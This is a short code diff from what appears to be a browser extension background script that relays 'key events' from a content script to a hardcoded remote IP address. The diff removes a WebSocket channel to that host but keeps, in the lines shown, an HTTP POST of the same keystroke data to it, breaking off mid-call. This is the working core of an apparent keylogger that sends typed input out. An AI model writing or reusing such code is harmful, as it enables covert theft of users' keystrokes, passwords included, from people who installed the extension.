@@ -1,18 +1,7 @@
-// Handle WebSocket connection
-const socket = new WebSocket('wss://192.42.1.174:9090');
-socket.addEventListener("open", (event) => {
-    socket.send("Hello Server!");
-});
-
 // Listen for key events from content script and send via WebSocket
 browser.runtime.onMessage.addListener((message) => {
     if (message.action === 'sendData') {
         const data = message.data;
-
-        // Send data via WebSocket
-        if (socket.readyState === WebSocket.OPEN) {
-            socket.send(data);
-        }
 
         // Send data via HTTP POST
         fetch('http://192.42.1.174:8080', {
